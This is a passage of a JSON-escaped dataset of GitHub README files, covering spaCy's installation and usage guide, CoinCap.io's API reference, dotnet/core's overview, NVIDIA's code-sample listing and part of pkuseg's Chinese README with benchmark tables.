downloads](https:\/\/img.shields.io\/pypi\/dm\/spacy?style=flat-square&logo=pypi&logoColor=white)](https:\/\/pypi.org\/project\/spacy\/)\n[![Conda downloads](https:\/\/img.shields.io\/conda\/dn\/conda-forge\/spacy?style=flat-square&logo=conda-forge&logoColor=white)](https:\/\/anaconda.org\/conda-forge\/spacy)\n[![Model downloads](https:\/\/img.shields.io\/github\/downloads\/explosion\/spacy-models\/total?style=flat-square&label=model+downloads)](https:\/\/github.com\/explosion\/spacy-models\/releases)\n[![Code style: black](https:\/\/img.shields.io\/badge\/code%20style-black-000000.svg?style=flat-square)](https:\/\/github.com\/ambv\/black)\n[![spaCy on Twitter](https:\/\/img.shields.io\/twitter\/follow\/spacy_io.svg?style=social&label=Follow)](https:\/\/twitter.com\/spacy_io)\n\n## \ud83d\udcd6 Documentation\n\n| Documentation   |                                                                |\n| --------------- | -------------------------------------------------------------- |\n| [spaCy 101]     | New to spaCy? Here's everything you need to know!              |\n| [Usage Guides]  | How to use spaCy and its features.                             |\n| [New in v2.2]   | New features, backwards incompatibilities and migration guide. |\n| [API Reference] | The detailed reference for spaCy's API.                        |\n| [Models]        | Download statistical language models for spaCy.                |\n| [Universe]      | Libraries, extensions, demos, books and courses.               |\n| [Changelog]     | Changes and version history.                                   |\n| [Contribute]    | How to contribute to the spaCy project and code base.          |\n\n[spacy 101]: https:\/\/spacy.io\/usage\/spacy-101\n[new in v2.2]: https:\/\/spacy.io\/usage\/v2-2\n[usage guides]: https:\/\/spacy.io\/usage\/\n[api reference]: https:\/\/spacy.io\/api\/\n[models]: https:\/\/spacy.io\/models\n[universe]: https:\/\/spacy.io\/universe\n[changelog]: https:\/\/spacy.io\/usage#changelog\n[contribute]: https:\/\/github.com\/explosion\/spaCy\/blob\/master\/CONTRIBUTING.md\n\n## \ud83d\udcac Where to ask questions\n\nThe spaCy project is maintained by [@honnibal](https:\/\/github.com\/honnibal) and\n[@ines](https:\/\/github.com\/ines), along with core contributors\n[@svlandeg](https:\/\/github.com\/svlandeg) and\n[@adrianeboyd](https:\/\/github.com\/adrianeboyd). Please understand that we won't\nbe able to provide individual support via email. We also believe that help is\nmuch more valuable if it's shared publicly, so that more people can benefit from\nit.\n\n| Type                     | Platforms                                              |\n| ------------------------ | ------------------------------------------------------ |\n| \ud83d\udea8 **Bug Reports**       | [GitHub Issue Tracker]                                 |\n| \ud83c\udf81 **Feature Requests**  | [GitHub Issue Tracker]                                 |\n| \ud83d\udc69\u200d\ud83d\udcbb **Usage Questions**   | [Stack Overflow] \u00b7 [Gitter Chat] \u00b7 [Reddit User Group] |\n| \ud83d\uddef **General Discussion** | [Gitter Chat] \u00b7 [Reddit User Group]                    |\n\n[github issue tracker]: https:\/\/github.com\/explosion\/spaCy\/issues\n[stack overflow]: https:\/\/stackoverflow.com\/questions\/tagged\/spacy\n[gitter chat]: https:\/\/gitter.im\/explosion\/spaCy\n[reddit user group]: https:\/\/www.reddit.com\/r\/spacynlp\n\n## Features\n\n- Non-destructive **tokenization**\n- **Named entity** recognition\n- Support for **50+ languages**\n- pretrained [statistical models](https:\/\/spacy.io\/models) and word vectors\n- State-of-the-art speed\n- Easy **deep learning** integration\n- Part-of-speech tagging\n- Labelled dependency parsing\n- Syntax-driven sentence segmentation\n- Built in **visualizers** for syntax and NER\n- Convenient string-to-hash mapping\n- Export to numpy data arrays\n- Efficient binary serialization\n- Easy **model packaging** and deployment\n- Robust, rigorously evaluated accuracy\n\n\ud83d\udcd6 **For more details, see the\n[facts, figures and benchmarks](https:\/\/spacy.io\/usage\/facts-figures).**\n\n## Install spaCy\n\nFor detailed installation instructions, see the\n[documentation](https:\/\/spacy.io\/usage).\n\n- **Operating system**: macOS \/ OS X \u00b7 Linux \u00b7 Windows (Cygwin, MinGW, Visual\n  Studio)\n- **Python version**: Python 2.7, 3.5+ (only 64 bit)\n- **Package managers**: [pip] \u00b7 [conda] (via `conda-forge`)\n\n[pip]: https:\/\/pypi.org\/project\/spacy\/\n[conda]: https:\/\/anaconda.org\/conda-forge\/spacy\n\n### pip\n\nUsing pip, spaCy releases are available as source packages and binary wheels (as\nof `v2.0.13`).\n\n```bash\npip install spacy\n```\n\nTo install additional data tables for lemmatization in **spaCy v2.2+** you can\nrun `pip install spacy[lookups]` or install\n[`spacy-lookups-data`](https:\/\/github.com\/explosion\/spacy-lookups-data)\nseparately. The lookups package is needed to create blank models with\nlemmatization data, and to lemmatize in languages that don't yet come with\npretrained models and aren't powered by third-party libraries.\n\nWhen using pip it is generally recommended to install packages in a virtual\nenvironment to avoid modifying system state:\n\n```bash\npython -m venv .env\nsource .env\/bin\/activate\npip install spacy\n```\n\n### conda\n\nThanks to our great community, we've finally re-added conda support. You can now\ninstall spaCy via `conda-forge`:\n\n```bash\nconda install -c conda-forge spacy\n```\n\nFor the feedstock including the build recipe and configuration, check out\n[this repository](https:\/\/github.com\/conda-forge\/spacy-feedstock). Improvements\nand pull requests to the recipe and setup are always appreciated.\n\n### Updating spaCy\n\nSome updates to spaCy may require downloading new statistical models. If you're\nrunning spaCy v2.0 or higher, you can use the `validate` command to check if\nyour installed models are compatible and if not, print details on how to update\nthem:\n\n```bash\npip install -U spacy\npython -m spacy validate\n```\n\nIf you've trained your own models, keep in mind that your training and runtime\ninputs must match. After updating spaCy, we recommend **retraining your models**\nwith the new version.\n\n\ud83d\udcd6 **For details on upgrading from spaCy 1.x to spaCy 2.x, see the\n[migration guide](https:\/\/spacy.io\/usage\/v2#migrating).**\n\n## Download models\n\nAs of v1.7.0, models for spaCy can be installed as **Python packages**. This\nmeans that they're a component of your application, just like any other module.\nModels can be installed using spaCy's `download` command, or manually by\npointing pip to a path or URL.\n\n| Documentation          |                                                               |\n| ---------------------- | ------------------------------------------------------------- |\n| [Available Models]     | Detailed model descriptions, accuracy figures and benchmarks. |\n| [Models Documentation] | Detailed usage instructions.                                  |\n\n[available models]: https:\/\/spacy.io\/models\n[models documentation]: https:\/\/spacy.io\/docs\/usage\/models\n\n```bash\n# download best-matching version of specific model for your spaCy installation\npython -m spacy download en_core_web_sm\n\n# pip install .tar.gz archive from path or URL\npip install \/Users\/you\/en_core_web_sm-2.2.0.tar.gz\npip install https:\/\/github.com\/explosion\/spacy-models\/releases\/download\/en_core_web_sm-2.2.0\/en_core_web_sm-2.2.0.tar.gz\n```\n\n### Loading and using models\n\nTo load a model, use `spacy.load()` with the model name, a shortcut link or a\npath to the model data directory.\n\n```python\nimport spacy\nnlp = spacy.load(\"en_core_web_sm\")\ndoc = nlp(\"This is a sentence.\")\n```\n\nYou can also `import` a model directly via its full name and then call its\n`load()` method with no arguments.\n\n```python\nimport spacy\nimport en_core_web_sm\n\nnlp = en_core_web_sm.load()\ndoc = nlp(\"This is a sentence.\")\n```\n\n\ud83d\udcd6 **For more info and examples, check out the\n[models documentation](https:\/\/spacy.io\/docs\/usage\/models).**\n\n## Compile from source\n\nThe other way to install spaCy is to clone its\n[GitHub repository](https:\/\/github.com\/explosion\/spaCy) and build it from\nsource. That is the common way if you want to make changes to the code base.\nYou'll need to make sure that you have a development environment consisting of a\nPython distribution including header files, a compiler,\n[pip](https:\/\/pip.pypa.io\/en\/latest\/installing\/),\n[virtualenv](https:\/\/virtualenv.pypa.io\/en\/latest\/) and\n[git](https:\/\/git-scm.com) installed. The compiler part is the trickiest. How to\ndo that depends on your system. See notes on Ubuntu, OS X and Windows for\ndetails.\n\n```bash\n# make sure you are using the latest pip\npython -m pip install -U pip\ngit clone https:\/\/github.com\/explosion\/spaCy\ncd spaCy\n\npython -m venv .env\nsource .env\/bin\/activate\nexport PYTHONPATH=`pwd`\npip install -r requirements.txt\npython setup.py build_ext --inplace\n```\n\nCompared to regular install via pip, [requirements.txt](requirements.txt)\nadditionally installs developer dependencies such as Cython. For more details\nand instructions, see the documentation on\n[compiling spaCy from source](https:\/\/spacy.io\/usage#source) and the\n[quickstart widget](https:\/\/spacy.io\/usage#section-quickstart) to get the right\ncommands for your platform and Python version.\n\n### Ubuntu\n\nInstall system-level dependencies via `apt-get`:\n\n```bash\nsudo apt-get install build-essential python-dev git\n```\n\n### macOS \/ OS X\n\nInstall a recent version of [XCode](https:\/\/developer.apple.com\/xcode\/),\nincluding the so-called \"Command Line Tools\". macOS and OS X ship with Python\nand git preinstalled.\n\n### Windows\n\nInstall a version of the\n[Visual C++ Build Tools](https:\/\/visualstudio.microsoft.com\/visual-cpp-build-tools\/)\nor [Visual Studio Express](https:\/\/visualstudio.microsoft.com\/vs\/express\/) that\nmatches the version that was used to compile your Python interpreter. For\nofficial distributions these are VS 2008 (Python 2.7), VS 2010 (Python 3.4) and\nVS 2015 (Python 3.5).\n\n## Run tests\n\nspaCy comes with an [extensive test suite](spacy\/tests). In order to run the\ntests, you'll usually want to clone the repository and build spaCy from source.\nThis will also install the required development dependencies and test utilities\ndefined in the `requirements.txt`.\n\nAlternatively, you can find out where spaCy is installed and run `pytest` on\nthat directory. Don't forget to also install the test utilities via spaCy's\n`requirements.txt`:\n\n```bash\npython -c \"import os; import spacy; print(os.path.dirname(spacy.__file__))\"\npip install -r path\/to\/requirements.txt\npython -m pytest <spacy-directory>\n```\n\nSee [the documentation](https:\/\/spacy.io\/usage#tests) for more details and\nexamples.\n"},{"repo":"\/CoinCapDev\/CoinCap.io","language":"HTML","readme_contents":"# CoinCap.io\n\n## This API will continue to operate as it has, but will be shut down on March 1, 2019. Our new API is: https:\/\/docs.coincap.io\/\n\n---\n\n## REST URLs\n\n#### \/coins  \n- Description: Array of all supported coins\n- URL: http:\/\/coincap.io\/coins\n- Response: \n    ```JSON\n    [\"300\", \"611\", \"808\", \"888\", \"INPAY\", \"XNG\", \"ARGUS\", \"DBIX\", \"DAR\", \"HMQ\"]\n    ```\n\n#### \/map  \n- Description: JSON object of Coin symbols\/names and known aliases\n- URL: http:\/\/coincap.io\/map\n- Response: \n    ```JSON\n    [\n        {\n            \"aliases\": [],\n            \"name\": \"300 Token\",\n            \"symbol\": \"300\"\n        },\n        {\n            \"aliases\": [],\n            \"name\": \"SixEleven\",\n            \"symbol\": \"611\"\n        },\n        {\n            \"aliases\": [],\n            \"name\": \"808Coin\",\n            \"symbol\": \"808\"\n        }\n    ]\n     ```\n\n#### \/front \n- Description: Front Page Data of current coin stats\n- URL: http:\/\/coincap.io\/front\n- Response:\n    ```JSON\n    [\n        {\n            \"cap24hrChange\": -6.05,\n            \"long\": \"Bitcoin\",\n            \"mktcap\": 65173805891.25,\n            \"perc\": -6.05,\n            \"price\": 3934.85,\n            \"shapeshift\": true,\n            \"short\": \"BTC\",\n            \"supply\": 16563225,\n            \"usdVolume\": 2337600000,\n            \"volume\": 2337600000,\n            \"vwapData\": 3997.5639538606733,\n            \"vwapDataBTC\": 3997.5639538606733\n        },\n        {\n            \"cap24hrChange\": -6.59,\n            \"long\": \"Ethereum\",\n            \"mktcap\": 26016428866.32,\n            \"perc\": -6.59,\n            \"price\": 275.02,\n            \"shapeshift\": true,\n            \"short\": \"ETH\",\n            \"supply\": 94598316,\n            \"usdVolume\": 945732000,\n            \"volume\": 945732000,\n            \"vwapData\": 278.03921067242516,\n            \"vwapDataBTC\": 278.03921067242516\n        }\n    ]\n    ```\n\n#### \/global \n- Description: Global data\n- URL: http:\/\/coincap.io\/global\n- Response:\n    ```JSON\n    {\n        \"altCap\": 70056946653.0021,\n        \"bitnodesCount\": 9350,\n        \"btcCap\": 65003614189.66167,\n        \"btcPrice\": 3924.57472440673,\n        \"dom\": 69.48,\n        \"totalCap\": 135060560842.66382,\n        \"volumeAlt\": 578834063.4608318,\n        \"volumeBtc\": 1317521389.0430577,\n        \"volumeTotal\": 1896355452.5038888\n    }\n    ```\n\n#### \/page\/:coin  \n- Description: must search by symbol ex BTC returns all data on a specific coin\n- URL: http:\/\/coincap.io\/page\/ETC\n    ```JSON\n    {\n        \"altCap\": 70977893975.02808,\n        \"bitnodesCount\": 9350,\n        \"btcCap\": 65149292318.25,\n        \"btcPrice\": 3933.37,\n        \"dom\": 69.49,\n        \"totalCap\": 136127186293.27805,\n        \"volumeAlt\": 579507047.7508223,\n        \"volumeBtc\": 1319701715.2883158,\n        \"volumeTotal\": 1899208763.0391374,\n        \"id\": \"ETC\",\n        \"_id\": \"c2f0fa55-495c-41e2-ad77-c66545b6d584\",\n        \"cap24hrChange\": -2.45,\n        \"display_name\": \"Ethereum Classic\",\n        \"status\": \"available\",\n        \"supply\": 95478079,\n        \"volume\": 106044000,\n        \"vwap_h24\": 14.584250499041465,\n        \"price_btc\": 0.003659301940567121,\n        \"price_eth\": 0.052350773626971485,\n        \"price_eur\": 12.076,\n        \"price_usd\": 14.334776791590517,\n        \"price_ltc\": 0.2325328883760402,\n        \"price_zec\": 0.06845529547566803,\n        \"market_cap\": 1368656950.954846,\n        \"type\": \"cmc\",\n        \"price\": 14.1888\n    }\n    ```\n\n#### \/history\/:coin \n- Description: Returns all history on a coin\n- URL: http:\/\/coincap.io\/history\/BTC\n- Response: \n    ```javascript\n    {\n        \"market_cap\": [\n            [\n                1504664370000,  \/\/ unix time (milliseconds)\n                74300994770     \/\/ market cap\n            ],\n            [\n                1504750775000,\n                74594182198\n            ]\n        ],\n        \"price\" : [\n            [\n                1504750775000,\n                4507.45 \n            ],\n            [\n                1504839280000,\n                4599.26\n            ]\n        ],\n        \"volume\": [\n            [\n                1504750775000,  \n                2095800000   \n            ],\n            [\n                1504839280000,\n                1752760000\n            ]\n        ]\n    }\n    ```\n\n#### \/history\/1day\/:coin \n- Description: Returns 1 day of price history for a given coin\n- URL: http:\/\/coincap.io\/history\/1day\/BTC\n\n#### \/history\/7day\/:coin \n- Description: Returns 7 days of price history for a given coin\n- URL: http:\/\/coincap.io\/history\/7day\/BTC\n\n#### \/history\/30day\/:coin \n- Description: Returns 30 days day of price history for a given coin\n- URL: http:\/\/coincap.io\/history\/30day\/BTC\n\n#### \/history\/90day\/:coin \n- Description: Returns 90 days of price history for a given coin\n- URL: http:\/\/coincap.io\/history\/90day\/DOGE\n\n#### \/history\/180day\/:coin \n- Description: Returns 180 days of price history for a given coin\n- URL: http:\/\/coincap.io\/history\/180day\/BTC\n\n\n#### \/history\/365day\/:coin \n- Description: Returns a years of price history for a given coin\n- URL: http:\/\/coincap.io\/history\/365day\/BTC\n\n### Socket API\n    https:\/\/coincap.io\n\n\nTo connect to CoinCap WebSockets you must use socket.io-client 1.4.6 or another\nwebsocket client compatiable with that version of Socket.io\n\n\n[Sample code attached](https:\/\/github.com\/CoinCapDev\/CoinCap\/blob\/master\/subscribe.html)\n\n#### Socket Response\n```JSON\n{\n\t\"coin\": \"XMR\",\n\t\"exchange_id\": \"bittrex\",\n\t\"market_id\": \"ETH_XMR\",\n\t\"message\": {\n\t\t\"coin\": \"XMR\",\n\t\t\"msg\": {\n\t\t\t\"cap24hrChange\": -6.96,\n\t\t\t\"long\": \"Monero\",\n\t\t\t\"mktcap\": 1581966162.9998832,\n\t\t\t\"perc\": -6.96,\n\t\t\t\"price\": 113.18142493836066,\n\t\t\t\"shapeshift\": true,\n\t\t\t\"short\": \"XMR\",\n\t\t\t\"supply\": 15074975,\n\t\t\t\"usdVolume\": 46837300,\n\t\t\t\"volume\": 46837300,\n\t\t\t\"vwapData\": 109.52716734604815,\n\t\t\t\"vwapDataBTC\": 109.52716734604815\n\t\t}\n\t},\n\t\"msg\": {\n\t\t\"cap24hrChange\": -6.96,\n\t\t\"long\": \"Monero\",\n\t\t\"mktcap\": 1581966162.9998832,\n\t\t\"perc\": -6.96,\n\t\t\"price\": 113.18142493836066,\n\t\t\"shapeshift\": true,\n\t\t\"short\": \"XMR\",\n\t\t\"supply\": 15074975,\n\t\t\"usdVolume\": 46837300,\n\t\t\"volume\": 46837300,\n\t\t\"vwapData\": 109.52716734604815,\n\t\t\"vwapDataBTC\": 109.52716734604815\n\t}\n}\n```\n\n\n"},{"repo":"\/dotnet\/core","language":"Shell","readme_contents":"\ufeff# .NET Core Home\n\nThe dotnet\/core repository is a good starting point for .NET Core.\n\nThe latest major release is [.NET Core 3.1](release-notes\/3.1). The latest patch updates are listed in [.NET Core release notes](release-notes\/README.md).\n\n## Download the latest .NET Core SDK\n\n* [.NET Core 3.1 SDK](release-notes\/3.1\/README.md)\n\n## .NET Core Releases and Daily Builds\n\n* [.NET Core released builds](release-notes\/README.md)\n* [.NET Core daily builds](daily-builds.md)\n\n## Learn about .NET Core\n\n* [Learn about .NET Core](https:\/\/docs.microsoft.com\/dotnet\/core)\n* [.NET Core Roadmap](https:\/\/github.com\/dotnet\/core\/blob\/master\/roadmap.md)\n* [Learn about the .NET platform](https:\/\/docs.microsoft.com\/dotnet\/standard\/)\n* [.NET Core release notes](https:\/\/github.com\/dotnet\/core\/blob\/master\/release-notes\/README.md)\n* [.NET Core Announcements](https:\/\/github.com\/dotnet\/announcements)\n* [.NET Core blog](https:\/\/blogs.msdn.microsoft.com\/dotnet\/tag\/net-core\/)\n\n## Getting help\n\n* [File a .NET Core issue](https:\/\/github.com\/dotnet\/core\/issues)\n* [File an ASP.NET Core issue](https:\/\/github.com\/aspnet\/home\/issues)\n* [File an issue for other components](Documentation\/core-repos.md)\n* [Ask on Stack Overflow](https:\/\/stackoverflow.com\/questions\/tagged\/.net-core)\n* [Contact Microsoft Support](https:\/\/support.microsoft.com\/contactus\/)\n* [VS Developer Community Portal](https:\/\/developercommunity.visualstudio.com\/) for \"full\" .NET Framework feedback (or via [Report a Problem](https:\/\/aka.ms\/vs-rap) tool)\n\n## How to Engage, Contribute and Provide Feedback\n\nThe .NET Core team encourages [contributions](https:\/\/github.com\/dotnet\/coreclr\/blob\/master\/Documentation\/project-docs\/contributing.md), both issues and PRs. The first step is finding the [.NET Core repository](Documentation\/core-repos.md) that you want to contribute to.\n\n### Community\n\nThis project uses the [.NET Foundation Code of Conduct](https:\/\/dotnetfoundation.org\/code-of-conduct) to define expected conduct in our community.\nInstances of abusive, harassing, or otherwise unacceptable behavior may be reported by contacting a project maintainer at conduct@dotnetfoundation.org.\n\n## .NET Foundation\n\nThe .NET Core platform is part of the [.NET Foundation](http:\/\/www.dotnetfoundation.org).\n\n## Licenses\n\n.NET Core repos typically use either the [MIT](LICENSE.TXT) or\n[Apache 2](http:\/\/www.apache.org\/licenses\/LICENSE-2.0) licenses for code.\nSome projects license documentation and other forms of content under\n[Creative Commons Attribution 4.0](http:\/\/creativecommons.org\/licenses\/by\/4.0\/).\n\nSee specific [repos](Documentation\/core-repos.md) to understand the license used.\n"},{"repo":"\/NVIDIA-developer-blog\/code-samples","language":"HTML","readme_contents":"Parallel Forall Code Samples\n============================\n\nThis repository contains CUDA, OpenACC, Python, MATLAB, and other source code examples from the NVIDIA [Parallel Forall Blog](http:\/\/developer.nvidia.com\/parallel-forall).\n\nLicense\n-------\n\nThese examples are released under the BSD open source license.  Refer to license.txt in this directory for full details.\n\nList of Code Samples\n--------------------\nposts\/002-openacc-example: An example of [OpenACC Directives programming].\n"},{"repo":"\/lancopku\/pkuseg-python","language":"Python","readme_contents":"# pkuseg\uff1a\u4e00\u4e2a\u591a\u9886\u57df\u4e2d\u6587\u5206\u8bcd\u5de5\u5177\u5305 [**(English Version)**](readme\/readme_english.md)\r\n\r\npkuseg \u662f\u57fa\u4e8e\u8bba\u6587[[Luo et. al, 2019](#\u8bba\u6587\u5f15\u7528)]\u7684\u5de5\u5177\u5305\u3002\u5176\u7b80\u5355\u6613\u7528\uff0c\u652f\u6301\u7ec6\u5206\u9886\u57df\u5206\u8bcd\uff0c\u6709\u6548\u63d0\u5347\u4e86\u5206\u8bcd\u51c6\u786e\u5ea6\u3002\r\n\r\n\r\n\r\n## \u76ee\u5f55\r\n\r\n* [\u4e3b\u8981\u4eae\u70b9](#\u4e3b\u8981\u4eae\u70b9)\r\n* [\u7f16\u8bd1\u548c\u5b89\u88c5](#\u7f16\u8bd1\u548c\u5b89\u88c5)\r\n* [\u5404\u7c7b\u5206\u8bcd\u5de5\u5177\u5305\u7684\u6027\u80fd\u5bf9\u6bd4](#\u5404\u7c7b\u5206\u8bcd\u5de5\u5177\u5305\u7684\u6027\u80fd\u5bf9\u6bd4)\r\n* [\u4f7f\u7528\u65b9\u5f0f](#\u4f7f\u7528\u65b9\u5f0f)\r\n* [\u8bba\u6587\u5f15\u7528](#\u8bba\u6587\u5f15\u7528)\r\n* [\u4f5c\u8005](#\u4f5c\u8005)\r\n* [\u5e38\u89c1\u95ee\u9898\u53ca\u89e3\u7b54](#\u5e38\u89c1\u95ee\u9898\u53ca\u89e3\u7b54)\r\n\r\n\r\n\r\n## \u4e3b\u8981\u4eae\u70b9\r\n\r\npkuseg\u5177\u6709\u5982\u4e0b\u51e0\u4e2a\u7279\u70b9\uff1a\r\n\r\n1. \u591a\u9886\u57df\u5206\u8bcd\u3002\u4e0d\u540c\u4e8e\u4ee5\u5f80\u7684\u901a\u7528\u4e2d\u6587\u5206\u8bcd\u5de5\u5177\uff0c\u6b64\u5de5\u5177\u5305\u540c\u65f6\u81f4\u529b\u4e8e\u4e3a\u4e0d\u540c\u9886\u57df\u7684\u6570\u636e\u63d0\u4f9b\u4e2a\u6027\u5316\u7684\u9884\u8bad\u7ec3\u6a21\u578b\u3002\u6839\u636e\u5f85\u5206\u8bcd\u6587\u672c\u7684\u9886\u57df\u7279\u70b9\uff0c\u7528\u6237\u53ef\u4ee5\u81ea\u7531\u5730\u9009\u62e9\u4e0d\u540c\u7684\u6a21\u578b\u3002 \u6211\u4eec\u76ee\u524d\u652f\u6301\u4e86\u65b0\u95fb\u9886\u57df\uff0c\u7f51\u7edc\u9886\u57df\uff0c\u533b\u836f\u9886\u57df\uff0c\u65c5\u6e38\u9886\u57df\uff0c\u4ee5\u53ca\u6df7\u5408\u9886\u57df\u7684\u5206\u8bcd\u9884\u8bad\u7ec3\u6a21\u578b\u3002\u5728\u4f7f\u7528\u4e2d\uff0c\u5982\u679c\u7528\u6237\u660e\u786e\u5f85\u5206\u8bcd\u7684\u9886\u57df\uff0c\u53ef\u52a0\u8f7d\u5bf9\u5e94\u7684\u6a21\u578b\u8fdb\u884c\u5206\u8bcd\u3002\u5982\u679c\u7528\u6237\u65e0\u6cd5\u786e\u5b9a\u5177\u4f53\u9886\u57df\uff0c\u63a8\u8350\u4f7f\u7528\u5728\u6df7\u5408\u9886\u57df\u4e0a\u8bad\u7ec3\u7684\u901a\u7528\u6a21\u578b\u3002\u5404\u9886\u57df\u5206\u8bcd\u6837\u4f8b\u53ef\u53c2\u8003 [**example.txt**](https:\/\/github.com\/lancopku\/pkuseg-python\/blob\/master\/example.txt)\u3002\r\n2. \u66f4\u9ad8\u7684\u5206\u8bcd\u51c6\u786e\u7387\u3002\u76f8\u6bd4\u4e8e\u5176\u4ed6\u7684\u5206\u8bcd\u5de5\u5177\u5305\uff0c\u5f53\u4f7f\u7528\u76f8\u540c\u7684\u8bad\u7ec3\u6570\u636e\u548c\u6d4b\u8bd5\u6570\u636e\uff0cpkuseg\u53ef\u4ee5\u53d6\u5f97\u66f4\u9ad8\u7684\u5206\u8bcd\u51c6\u786e\u7387\u3002\r\n3. \u652f\u6301\u7528\u6237\u81ea\u8bad\u7ec3\u6a21\u578b\u3002\u652f\u6301\u7528\u6237\u4f7f\u7528\u5168\u65b0\u7684\u6807\u6ce8\u6570\u636e\u8fdb\u884c\u8bad\u7ec3\u3002\r\n4. \u652f\u6301\u8bcd\u6027\u6807\u6ce8\u3002\r\n\r\n\r\n## \u7f16\u8bd1\u548c\u5b89\u88c5\r\n\r\n- \u76ee\u524d**\u4ec5\u652f\u6301python3**\r\n- **\u4e3a\u4e86\u83b7\u5f97\u597d\u7684\u6548\u679c\u548c\u901f\u5ea6\uff0c\u5f3a\u70c8\u5efa\u8bae\u5927\u5bb6\u901a\u8fc7pip install\u66f4\u65b0\u5230\u76ee\u524d\u7684\u6700\u65b0\u7248\u672c**\r\n\r\n1. \u901a\u8fc7PyPI\u5b89\u88c5(\u81ea\u5e26\u6a21\u578b\u6587\u4ef6)\uff1a\r\n\t```\r\n\tpip3 install pkuseg\r\n\t\u4e4b\u540e\u901a\u8fc7import pkuseg\u6765\u5f15\u7528\r\n\t```\r\n   **\u5efa\u8bae\u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c**\u4ee5\u83b7\u5f97\u66f4\u597d\u7684\u5f00\u7bb1\u4f53\u9a8c\uff1a\r\n   \t```\r\n\tpip3 install -U pkuseg\r\n\t```\r\n2. \u5982\u679cPyPI\u5b98\u65b9\u6e90\u4e0b\u8f7d\u901f\u5ea6\u4e0d\u7406\u60f3\uff0c\u5efa\u8bae\u4f7f\u7528\u955c\u50cf\u6e90\uff0c\u6bd4\u5982\uff1a   \r\n   \u521d\u6b21\u5b89\u88c5\uff1a\r\n\t```\r\n\tpip3 install -i https:\/\/pypi.tuna.tsinghua.edu.cn\/simple pkuseg\r\n\t```\r\n   \u66f4\u65b0\uff1a\r\n\t```\r\n\tpip3 install -i https:\/\/pypi.tuna.tsinghua.edu.cn\/simple -U pkuseg\r\n\t```\r\n   \r\n3. \u5982\u679c\u4e0d\u4f7f\u7528pip\u5b89\u88c5\u65b9\u5f0f\uff0c\u9009\u62e9\u4eceGitHub\u4e0b\u8f7d\uff0c\u53ef\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5\uff1a\r\n\t```\r\n\tpython setup.py build_ext -i\r\n\t```\r\n\t\r\n   GitHub\u7684\u4ee3\u7801\u5e76\u4e0d\u5305\u62ec\u9884\u8bad\u7ec3\u6a21\u578b\uff0c\u56e0\u6b64\u9700\u8981\u7528\u6237\u81ea\u884c\u4e0b\u8f7d\u6216\u8bad\u7ec3\u6a21\u578b\uff0c\u9884\u8bad\u7ec3\u6a21\u578b\u53ef\u8be6\u89c1[release](https:\/\/github.com\/lancopku\/pkuseg-python\/releases)\u3002\u4f7f\u7528\u65f6\u9700\u8bbe\u5b9a\"model_name\"\u4e3a\u6a21\u578b\u6587\u4ef6\u3002\r\n\r\n\u6ce8\u610f\uff1a**\u5b89\u88c5\u65b9\u5f0f1\u548c2\u76ee\u524d\u4ec5\u652f\u6301linux(ubuntu)\u3001mac\u3001windows 64 \u4f4d\u7684python3\u7248\u672c**\u3002\u5982\u679c\u975e\u4ee5\u4e0a\u7cfb\u7edf\uff0c\u8bf7\u4f7f\u7528\u5b89\u88c5\u65b9\u5f0f3\u8fdb\u884c\u672c\u5730\u7f16\u8bd1\u5b89\u88c5\u3002\r\n\t\r\n\r\n## \u5404\u7c7b\u5206\u8bcd\u5de5\u5177\u5305\u7684\u6027\u80fd\u5bf9\u6bd4\r\n\r\n\u6211\u4eec\u9009\u62e9jieba\u3001THULAC\u7b49\u56fd\u5185\u4ee3\u8868\u5206\u8bcd\u5de5\u5177\u5305\u4e0epkuseg\u505a\u6027\u80fd\u6bd4\u8f83\uff0c\u8be6\u7ec6\u8bbe\u7f6e\u53ef\u53c2\u8003[\u5b9e\u9a8c\u73af\u5883](readme\/environment.md)\u3002\r\n\r\n\r\n\r\n#### \u7ec6\u9886\u57df\u8bad\u7ec3\u53ca\u6d4b\u8bd5\u7ed3\u679c\r\n\r\n\u4ee5\u4e0b\u662f\u5728\u4e0d\u540c\u6570\u636e\u96c6\u4e0a\u7684\u5bf9\u6bd4\u7ed3\u679c\uff1a\r\n\r\n| MSRA   | Precision | Recall |   F-score |\r\n| :----- | --------: | -----: | --------: |\r\n| jieba  |     87.01 |  89.88 |     88.42 |\r\n| THULAC |     95.60 |  95.91 |     95.71 |\r\n| pkuseg |     96.94 |  96.81 | **96.88** |\r\n\r\n\r\n| WEIBO  | Precision | Recall |   F-score |\r\n| :----- | --------: | -----: | --------: |\r\n| jieba  |     87.79 |  87.54 |     87.66 |\r\n| THULAC |     93.40 |  92.40 |     92.87 |\r\n| pkuseg |     93.78 |  94.65 | **94.21** |\r\n\r\n\r\n\r\n\r\n#### \u9ed8\u8ba4\u6a21\u578b\u5728\u4e0d\u540c\u9886\u57df\u7684\u6d4b\u8bd5\u6548\u679c\r\n\r\n\u8003\u8651\u5230\u5f88\u591a\u7528\u6237\u5728\u5c1d\u8bd5\u5206\u8bcd\u5de5\u5177\u7684\u65f6\u5019\uff0c\u5927\u591a\u6570\u65f6\u5019\u4f1a\u4f7f\u7528\u5de5\u5177\u5305\u81ea\u5e26\u6a21\u578b\u6d4b\u8bd5\u3002\u4e3a\u4e86\u76f4\u63a5\u5bf9\u6bd4\u201c\u521d\u59cb\u201d\u6027\u80fd\uff0c\u6211\u4eec\u4e5f\u6bd4\u8f83\u4e86\u5404\u4e2a\u5de5\u5177\u5305\u7684\u9ed8\u8ba4\u6a21\u578b\u5728\u4e0d\u540c\u9886\u57df\u7684\u6d4b\u8bd5\u6548\u679c\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u6837\u7684\u6bd4\u8f83\u53ea\u662f\u4e3a\u4e86\u8bf4\u660e\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7684\u6548\u679c\uff0c\u5e76\u4e0d\u4e00\u5b9a\u662f\u516c\u5e73\u7684\u3002\r\n\r\n| Default | MSRA  | CTB8  | PKU   | WEIBO | All Average |\r\n| ------- | :---: | :---: | :---: | :---: | :---------: |\r\n| jieba  | 81.45 | 79.58 | 81.83 | 83.56 | 81.61       |\r\n| THULAC |\t85.55 | 87.84 | 92.29 | 86.65 | 88.08 |\r\n| pkuseg | 87.29 | 91.77 | 92.68 | 93.43 | **91.29**   |\r\n\r\n\u5176\u4e2d\uff0c`All 